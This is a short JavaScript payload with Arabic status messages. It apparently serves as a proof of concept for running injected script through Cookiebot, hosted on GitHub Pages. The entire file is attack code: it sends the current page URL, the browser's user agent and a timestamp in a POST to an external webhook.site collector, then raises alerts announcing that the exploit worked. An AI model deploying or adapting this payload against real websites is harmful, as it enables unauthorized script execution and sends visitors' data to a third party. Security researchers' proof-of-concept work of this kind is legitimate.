console.log("🚨 بدء تنفيذ السكربت ...");

fetch("https://webhook.site/aa572160-0dad-47bf-a5c0-b663377c4ac6", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    msg: "✅ تم استغلال Cookiebot في: " + location.href,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  })
})
.then(res => res.text())
.then(txt => {
  console.log("✅ تم الإرسال، الرد:", txt);
  alert("📬 تم إرسال البيانات إلى Webhook.site!");
})
.catch(err => {
  console.error("❌ فشل الإرسال:", err);
  alert("❌ فشل إرسال البيانات");
});

alert("🔥 السكربت شغّال من GitHub Pages!");
